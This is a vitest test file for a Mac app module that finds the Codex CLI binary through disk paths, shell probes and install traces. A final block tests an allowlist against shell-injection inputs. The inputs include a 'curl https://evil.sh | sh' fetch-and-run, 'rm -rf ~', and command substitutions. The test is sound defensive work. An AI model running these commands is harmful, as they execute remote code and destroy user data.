// Is Codex on this Mac, and where. Nothing here spawns it.
//
// The second engine is coming back in stages and this is the stage that only
// LOOKS. `shared/engines.mjs` already takes a `found` map and decides which
// engine a row runs on; until this file's subject existed, nothing on the
// machine could produce that map for Codex, so the second row of that map was
// permanently absent and the gate above it was arguing with nobody.
//
// MEASURED ON THIS MAC 2026-09-04, and the numbers are why several of these
// tests assert what the 2026-08-25 original did not:
//
//   codex-cli 0.148.0, `/opt/homebrew/bin/codex`, a Homebrew CASK (not a
//   formula) whose bin entry is a SYMLINK into
//   `/opt/homebrew/Caskroom/codex/0.148.0/bin/codex`. `brew info --cask codex`
//   the same minute: 0.148.0 installed, 0.152.1 available, so the swap that
//   leaves that symlink dangling for a moment is a live state and not a story.
//
//   `~/.codex` holds 38 entries. auth.json, config.toml, sessions/ (1691
//   rollout files, newest 2026-09-03) and history.jsonl are all still there,
//   so the original's evidence list is not wrong. It is INCOMPLETE: the same
//   directory now also holds state_5.sqlite, thread_history_1.sqlite,
//   logs_2.sqlite, memories_1.sqlite, queue_1.sqlite, goals_1.sqlite,
//   models_cache.json, installation_id and shell_snapshots/, and history.jsonl
//   has not been written since 2026-06-03 while sessions/ was written
//   yesterday. A list of four filenames is a list that ages.
//
//   `https://chatgpt.com/codex/install.sh`, read the same day, is the install
//   method the docs now lead with, and it is the one the original could not
//   have known: `BIN_DIR="${CODEX_INSTALL_DIR:-$HOME/.local/bin}"`,
//   `CODEX_HOME_DIR="${CODEX_HOME:-$HOME/.codex}"`,
//   `STANDALONE_ROOT="$CODEX_HOME_DIR/packages/standalone"`. It links
//   `~/.local/bin/codex` at a versioned file under that root and swaps the file
//   on every update, which is the same shape `~/.local/bin/claude` has and the
//   reason the dangling-symlink rule exists at all.
//
// THE ONE THAT IS NOT ABOUT CODEX AT ALL is the last describe block. Finding
// Codex reuses Claude Code's shell probe rather than growing a second copy of
// the "two different silences" rule, which means a shared function changed
// underneath the one binary this app cannot open without. That block is the
// price of sharing it.

import { describe, it, expect } from 'vitest';
import {
  findCodexBin, candidatePaths, versionedPaths, evidencePaths, installEvidence,
  resolveCodexBin, forgetCodexBin, INSTALL_URL,
} from '../main/codex-bin.mjs';
import {
  askShell, shellProbes, findClaudeBin, candidatePaths as claudeCandidatePaths,
} from '../main/claude-bin.mjs';

const HOME = '/Users/stranger';
const only = (...paths) => (p) => paths.includes(p);
const never = () => false;
const noShell = () => ({ path: null, answered: true });
const shellSaying = (text) => () => text;

describe('finding Codex', () => {
  // The installer's own path goes first for the same reason Claude Code's
  // does: it is the answer the tool itself produces, so a machine that was set
  // up the documented way is settled by the first stat call.
  it('finds the shell installer path first, before anything a package manager left', () => {
    const installed = `${HOME}/.local/bin/codex`;
    const found = findCodexBin({
      home: HOME, exists: only(installed, '/opt/homebrew/bin/codex'), shellLookup: noShell,
    });
    expect(found).toMatchObject({ path: installed, found: true, from: 'disk', certain: true });
  });

  it.each([
    ['the Homebrew cask on Apple Silicon', '/opt/homebrew/bin/codex'],
    ['Homebrew on Intel, and npm -g into /usr/local', '/usr/local/bin/codex'],
    ['a custom npm prefix of ~/.npm-global', `${HOME}/.npm-global/bin/codex`],
    ['pnpm on macOS', `${HOME}/Library/pnpm/codex`],
    ["the standalone store, when CODEX_INSTALL_DIR put the link somewhere we do not know", `${HOME}/.codex/packages/standalone/current/bin/codex`],
  ])('finds it after %s', (_how, where) => {
    const found = findCodexBin({ home: HOME, exists: only(where), shellLookup: noShell });
    expect(found).toMatchObject({ path: where, found: true, from: 'disk' });
  });

  it('reads the per-Node bin directories rather than guessing their names', () => {
    const readdir = (dir) => (dir === `${HOME}/.nvm/versions/node` ? ['v22.14.0', 'v20.11.0'] : []);
    expect(versionedPaths(HOME, readdir)).toContain(`${HOME}/.nvm/versions/node/v22.14.0/bin/codex`);

    const viaNvm = `${HOME}/.nvm/versions/node/v20.11.0/bin/codex`;
    const found = findCodexBin({ home: HOME, exists: only(viaNvm), readdir, shellLookup: noShell });
    expect(found).toMatchObject({ path: viaNvm, found: true, from: 'disk' });
  });

  it('asks the shell only after every cheap check has missed', () => {
    const odd = '/opt/somewhere/nobody/lists/codex';
    const found = findCodexBin({
      home: HOME, exists: only(odd), shellLookup: () => ({ path: odd, answered: true }),
    });
    expect(found).toMatchObject({ path: odd, found: true, from: 'shell' });
    expect(found.searched).toEqual(candidatePaths(HOME));
  });

  // NOT FOUND IS A SENTENCE, NOT A GUESS. The failure this rules out is the
  // one Claude Code had: reporting a plausible path as though it were real,
  // which turns into a spawn that fails naming a file nobody ever installed.
  it('says missing rather than naming a path that is not there', () => {
    const found = findCodexBin({ home: HOME, exists: never, dangles: never, shellLookup: noShell });
    expect(found).toMatchObject({ path: null, found: false, from: null, evidence: null });
  });

  it('never searches around a path she set herself', () => {
    const hers = '/somewhere/she/chose/codex';
    const found = findCodexBin({
      configured: hers,
      home: HOME,
      exists: only(hers, '/opt/homebrew/bin/codex'),
      shellLookup: () => { throw new Error('must not shell out over her setting'); },
    });
    expect(found).toMatchObject({ path: hers, found: true, from: 'settings', certain: true });
  });

  it('keeps her path but reports not found when her path is not there', () => {
    const found = findCodexBin({ configured: '/gone/codex', home: HOME, exists: never });
    expect(found).toMatchObject({ path: '/gone/codex', found: false, from: 'settings', certain: true });
  });
});

// THE CASE THAT MUST NOT MATCH, and it is the reason this finder does not just
// read `command -v`. `command -v` prints a shell FUNCTION BODY or an alias with
// the same exit code it uses for a real path, and a function name handed to
// spawn is ENOENT on a filename nobody can search for.
describe('what the shell says is not automatically a binary', () => {
  it('asks about codex, not about claude', () => {
    let seen = null;
    askShell({
      bin: 'codex', env: { SHELL: '/bin/zsh' }, exists: () => true,
      run: (shell, args) => { seen = args; return '/opt/homebrew/bin/codex\n'; },
    });
    expect(seen[1]).toBe('command -v codex');
  });

  it('takes an absolute path that exists', () => {
    expect(askShell({
      bin: 'codex', env: {}, exists: () => true, run: shellSaying('/opt/homebrew/bin/codex\n'),
    })).toMatchObject({ path: '/opt/homebrew/bin/codex', answered: true });
  });

  it('refuses a shell function, which spawn() cannot run', () => {
    // It still ANSWERED. The shell ran, and what it printed being unspawnable
    // is a fact about this machine rather than a failure to ask.
    expect(askShell({
      bin: 'codex', env: {}, exists: () => true,
      run: shellSaying('codex () {\n\t/opt/homebrew/bin/codex --search "$@"\n}\n'),
    })).toMatchObject({ path: null, answered: true });
  });

  it('refuses an alias line', () => {
    expect(askShell({
      bin: 'codex', env: {}, exists: () => true,
      run: shellSaying("codex: aliased to codex --sandbox workspace-write\n"),
    })).toMatchObject({ path: null, answered: true });
  });

  it('refuses a bare name with no slash in it', () => {
    expect(askShell({
      bin: 'codex', env: {}, exists: () => true, run: shellSaying('codex\n'),
    })).toMatchObject({ path: null, answered: true });
  });

  it('refuses a path the shell named that is not on disk', () => {
    expect(askShell({
      bin: 'codex', env: {}, exists: never, run: shellSaying('/gone/codex\n'),
    })).toMatchObject({ path: null, answered: true });
  });

  // And the whole way through: a function name never becomes a path even when
  // the search has nothing else, which is the state a fresh Mac is in.
  it('does not let a function name become the path Codex would be spawned from', () => {
    const found = findCodexBin({
      home: HOME,
      exists: never,
      dangles: never,
      shellLookup: () => askShell({
        bin: 'codex', env: {}, exists: never,
        run: shellSaying('codex () {\n\tnode /x/codex.js\n}\n'),
      }),
    });
    expect(found.path).toBeNull();
    expect(found.found).toBe(false);
  });
});

// TWO DIFFERENT SILENCES, AND ONLY ONE OF THEM IS AN ANSWER. A shell that ran
// and exited non-zero has told us codex is not on PATH. A shell that could not
// start, or that ran past the timeout, has told us nothing, and the two arrive
// at the same empty string.
describe('a shell that said no, and a shell that said nothing', () => {
  it('counts a non-zero exit as the shell saying no', () => {
    const exited = Object.assign(new Error('exit 1'), { status: 1 });
    expect(askShell({
      bin: 'codex', env: {}, exists: () => true, run: () => { throw exited; },
    })).toMatchObject({ path: null, answered: true });
  });

  it('counts a timeout as no answer at all', () => {
    const timedOut = Object.assign(new Error('timed out'), { code: 'ETIMEDOUT', signal: 'SIGTERM' });
    expect(askShell({
      bin: 'codex', env: {}, exists: () => true, run: () => { throw timedOut; },
    })).toMatchObject({ path: null, answered: false });
  });

  it('counts a shell that will not start as no answer at all', () => {
    const gone = Object.assign(new Error('spawn ENOENT'), { code: 'ENOENT' });
    expect(askShell({
      bin: 'codex', env: { SHELL: '/bin/nope' }, exists: () => true, run: () => { throw gone; },
    })).toMatchObject({ path: null, answered: false });
  });

  it('is sure Codex is missing only when a shell actually answered', () => {
    const bare = { home: HOME, exists: never, dangles: never };
    expect(findCodexBin({ ...bare, shellLookup: () => ({ path: null, answered: true }) }))
      .toMatchObject({ found: false, certain: true });
    expect(findCodexBin({ ...bare, shellLookup: () => ({ path: null, answered: false }) }))
      .toMatchObject({ found: false, certain: false });
  });

  it('still reads a bare path from a lookup, which is what askShell used to return', () => {
    const odd = '/opt/weird/codex';
    expect(findCodexBin({ home: HOME, exists: only(odd), shellLookup: () => odd }))
      .toMatchObject({ path: odd, found: true, certain: true, from: 'shell' });
  });
});

// WHAT CODEX LEAVES BEHIND. None of these is a binary and none is ever
// spawned. They exist only to take away the right to announce an absence.
describe('the traces that stop us claiming an empty machine', () => {
  it('counts the files Codex writes the first time it is used', () => {
    const paths = evidencePaths(HOME, {});
    expect(paths).toEqual(expect.arrayContaining([
      `${HOME}/.codex/auth.json`,
      `${HOME}/.codex/config.toml`,
      `${HOME}/.codex/sessions`,
      `${HOME}/.codex`,
    ]));
  });

  // Added on the measurement above: the standalone installer's version store
  // is the one trace that exists on a machine where the binary itself has been
  // moved somewhere no list covers.
  it('counts the standalone installer version store', () => {
    expect(evidencePaths(HOME, {})).toContain(`${HOME}/.codex/packages/standalone/releases`);
  });

  // `~/.codex` last and broad on purpose. The directory now holds sqlite files
  // whose names carry a schema number (state_5, thread_history_1, logs_2) and
  // a list of filenames cannot hold a number that increments.
  it('falls back to the directory itself, which no rename inside it can dodge', () => {
    expect(installEvidence({ home: HOME, exists: only(`${HOME}/.codex`), dangles: never }))
      .toBe(`${HOME}/.codex`);
  });

  it('follows CODEX_HOME when the machine has moved that directory', () => {
    const moved = '/Volumes/work/codex-home';
    expect(evidencePaths(HOME, { CODEX_HOME: moved })).toContain(`${moved}/auth.json`);
    // And still looks in the default, because a stale CODEX_HOME in the
    // environment is not proof the ordinary one is gone.
    expect(evidencePaths(HOME, { CODEX_HOME: moved })).toContain(`${HOME}/.codex`);
  });

  it('reads a dangling symlink as evidence, which is a cask mid-upgrade', () => {
    // /opt/homebrew/bin/codex points into Caskroom/codex/<version>, and the
    // upgrade that replaces 0.148.0 with 0.152.1 unlinks the old target first.
    // existsSync follows the link and says false, which is indistinguishable
    // from Codex never having been here and means the opposite.
    const found = findCodexBin({
      home: HOME,
      exists: never,
      dangles: only('/opt/homebrew/bin/codex'),
      shellLookup: () => ({ path: null, answered: true }),
    });
    expect(found).toMatchObject({ found: false, certain: false, evidence: '/opt/homebrew/bin/codex' });
  });

  it('is not sure while ~/.codex is still there, however the search went', () => {
    const found = findCodexBin({
      home: HOME,
      exists: only(`${HOME}/.codex`),
      dangles: never,
      shellLookup: () => ({ path: null, answered: true }),
    });
    expect(found).toMatchObject({ found: false, certain: false, evidence: `${HOME}/.codex` });
  });

  it('points at a page that is actually served today', () => {
    // The 2026-08-25 original pointed at developers.openai.com/codex/cli, which
    // now answers 308 to learn.chatgpt.com/docs/codex/cli.
    expect(INSTALL_URL).toBe('https://learn.chatgpt.com/docs/codex/cli');
  });
});

describe('the shell answer is held briefly and the stat calls never are', () => {
  it('asks the shell once inside its window, and again after it', () => {
    forgetCodexBin();
    let asks = 0;
    const t0 = 2_000_000;
    const bare = {
      home: HOME, exists: never, dangles: never,
      shellLookup: () => { asks += 1; return { path: null, answered: true }; },
    };

    resolveCodexBin(null, { ...bare, now: t0 });
    resolveCodexBin(null, { ...bare, now: t0 + 29_999 });
    expect(asks).toBe(1);

    resolveCodexBin(null, { ...bare, now: t0 + 30_001 });
    expect(asks).toBe(2);
    forgetCodexBin();
  });

  it('sees a Codex installed a second ago, because the disk checks are never cached', () => {
    forgetCodexBin();
    const t0 = 2_000_000;
    let installed = false;
    const bare = {
      home: HOME,
      exists: (p) => installed && p === '/opt/homebrew/bin/codex',
      dangles: never,
      shellLookup: () => ({ path: null, answered: true }),
    };

    expect(resolveCodexBin(null, { ...bare, now: t0 }).found).toBe(false);
    installed = true;
    expect(resolveCodexBin(null, { ...bare, now: t0 + 1 }).found).toBe(true);
    forgetCodexBin();
  });
});

// THE REGRESSION GUARD, AND IT IS THE RISK IN THIS CHANGE. `askShell` grew a
// `bin` parameter so the two finders share one probe. The binary that matters
// is the other one: the app refuses to open an inbox without Claude Code, so a
// default that shifted by one character here would be a black screen, and it
// would be a black screen for a change about software she has not switched on.
describe('Claude Code is still asked for exactly as it was', () => {
  it('asks about claude when nobody passes a bin', () => {
    let seen = null;
    askShell({
      env: { SHELL: '/bin/zsh' }, exists: () => true,
      run: (shell, args) => { seen = args; return '/usr/local/bin/claude\n'; },
    });
    expect(seen[1]).toBe('command -v claude');
  });

  it('asks the same shells, with the same flags, in the same order, for either binary', () => {
    const probesFor = (options) => {
      const seen = [];
      askShell({
        env: { SHELL: '/bin/zsh' }, exists: never,
        run: (shell, args) => { seen.push([shell, args[0]]); return ''; },
        ...options,
      });
      return seen;
    };
    expect(probesFor({ bin: 'codex' })).toEqual(probesFor({}));
    expect(probesFor({})).toEqual(shellProbes({ SHELL: '/bin/zsh' }).map(([s, f]) => [s, f]));
  });

  it('still refuses a claude shell function, and still calls that an answer', () => {
    expect(askShell({
      env: {}, exists: () => true, run: shellSaying('claude () {\n\tnode /x/cli.js\n}\n'),
    })).toMatchObject({ path: null, answered: true });
  });

  it('still tells a claude timeout apart from a claude no', () => {
    const timedOut = Object.assign(new Error('timed out'), { code: 'ETIMEDOUT', signal: 'SIGTERM' });
    const exited = Object.assign(new Error('exit 1'), { status: 1 });
    expect(askShell({ env: {}, exists: () => true, run: () => { throw timedOut; } }).answered).toBe(false);
    expect(askShell({ env: {}, exists: () => true, run: () => { throw exited; } }).answered).toBe(true);
  });

  it('finds Claude Code in the same places, and still prefers its own installer', () => {
    const installer = `${HOME}/.local/bin/claude`;
    expect(findClaudeBin({
      home: HOME, exists: only(installer, '/opt/homebrew/bin/claude'), shellLookup: noShell,
    })).toMatchObject({ path: installer, found: true, from: 'disk' });
    expect(claudeCandidatePaths(HOME)[0]).toBe(installer);
  });

  // The two lists are about two different binaries and neither may leak into
  // the other. A `claude` in the codex list would spawn the wrong agent.
  it('never offers a claude path as a codex path, or the other way round', () => {
    for (const p of [...candidatePaths(HOME), ...versionedPaths(HOME, () => ['v22.14.0'])]) {
      expect(p.endsWith('/codex')).toBe(true);
    }
    for (const p of claudeCandidatePaths(HOME)) expect(p.endsWith('/claude')).toBe(true);
  });
});

/* --------------------- the layout the installer also writes ---------------- */

// BOTH SHAPES ARE REAL, and the first version of this file only knew one.
//
// Read out of `https://chatgpt.com/codex/install.sh` on 2026-09-04, which is
// the install method the docs now lead with:
//
//   line  951:  ln -sf "bin/codex" "$stage_release/codex"
//   line 1021:  installed_version="$(version_from_binary "$release_dir/bin/codex" \
// || version_from_binary "$release_dir/codex" || true)"
//
// So every release the installer stages carries the binary at BOTH
// `<release>/bin/codex` and `<release>/codex`, and the installer itself accepts
// either when it goes looking. `current` is a symlink at that release, so
// `current/codex` resolves on a machine set up the documented way and this file
// used to walk straight past it.
//
// This search is cheapest-first and every entry is one stat call, so carrying
// both costs nothing and missing one costs a person the app saying their Codex
// is not installed while they are looking at it.
describe('the standalone store keeps its binary in two places', () => {
  it.each([
    ['the versioned bin directory', `${HOME}/.codex/packages/standalone/current/bin/codex`],
    ['the release root, where the installer also links it', `${HOME}/.codex/packages/standalone/current/codex`],
  ])('finds it at %s', (_where, path) => {
    const found = findCodexBin({ home: HOME, exists: only(path), shellLookup: noShell });
    expect(found).toMatchObject({ path, found: true, from: 'disk', certain: true });
  });

  it('lists both, so neither depends on the other being absent', () => {
    const paths = candidatePaths(HOME);
    expect(paths).toContain(`${HOME}/.codex/packages/standalone/current/bin/codex`);
    expect(paths).toContain(`${HOME}/.codex/packages/standalone/current/codex`);
  });

  // THE CASE THAT MUST NOT MATCH. `current` is the only link this search
  // follows. A release directory sitting beside it is not what the installer
  // points `codex` at, and neither is the host binary that ships next to it,
  // so finding either would be reporting a path that is not the one running.
  it.each([
    ['a release directory that current does not point at', `${HOME}/.codex/packages/standalone/releases/0.148.0/bin/codex`],
    ['the code-mode host that ships beside it', `${HOME}/.codex/packages/standalone/current/bin/codex-code-mode-host`],
    ['the store root itself', `${HOME}/.codex/packages/standalone/codex`],
  ])('does not take %s for the binary', (_what, path) => {
    expect(candidatePaths(HOME)).not.toContain(path);
    const found = findCodexBin({ home: HOME, exists: only(path), shellLookup: noShell });
    expect(found).toMatchObject({ path: null, found: false });
  });
});

/* ------------------- what may be handed to a login shell ------------------- */

// `askShell` interpolates `bin` into a string that a LOGIN, INTERACTIVE shell
// runs: `command -v ${bin}`. Both callers today pass a literal, 'claude' or
// 'codex', so nothing is exploitable now -- but the whole direction of this
// work is a configurable second engine, and a `codexBin` read out of
// zero.config.json reaching this argument is one plausible slice away. At that
// point `command -v x; curl evil.sh | sh` is a string in a file that runs as
// her, with her shell profile loaded.
//
// The fix is the boring one: this function looks up program NAMES, so a name is
// all it accepts. Not quoting -- an allowlist of the shape, so the failure is
// loud and at the call site rather than subtly escaped somewhere downstream.
describe('the shell is only ever asked about a program name', () => {
  const ran = [];
  const run = (_shell, args) => { ran.push(args[1]); return '/opt/homebrew/bin/x\n'; };

  it.each([
    ['a command separator', 'codex; curl https://evil.sh | sh'], // public-check: allow
    ['a background chain', 'codex && rm -rf ~'],
    ['a substitution', 'codex$(whoami)'],
    ['a backtick substitution', 'codex`id`'],
    ['a pipe', 'codex | tee /tmp/x'],
    ['a redirect', 'codex > /tmp/x'],
    ['a newline', 'codex\nrm -rf ~'],
    ['a variable', 'codex$HOME'],
    ['a quote', "codex'"],
    ['a space', 'codex --version'],
    ['a path rather than a name', '/opt/homebrew/bin/codex'],
    ['nothing at all', ''],
  ])('refuses to ask a shell about %s, and runs nothing', (_what, bin) => {
    ran.length = 0;
    expect(() => askShell({ bin, env: {}, exists: () => true, run })).toThrow(/program name/i);
    expect(ran).toEqual([]);
  });

  it.each(['claude', 'codex', 'codex-code-mode-host', 'node22', 'my_tool.v2'])('still asks about %s', (bin) => {
    ran.length = 0;
    expect(askShell({ bin, env: {}, exists: () => true, run })).toMatchObject({ path: '/opt/homebrew/bin/x' });
    expect(ran[0]).toBe(`command -v ${bin}`);
  });

  // The two real callers, unchanged, which is the point of the allowlist being
  // this shape rather than tighter.
  it('lets both of this repo default lookups through untouched', () => {
    ran.length = 0;
    askShell({ env: {}, exists: () => true, run });
    findCodexBin({ home: HOME, exists: never, shellLookup: () => askShell({ bin: 'codex', env: {}, exists: () => true, run }) });
    expect(ran).toEqual(['command -v claude', 'command -v codex']);
  });
});
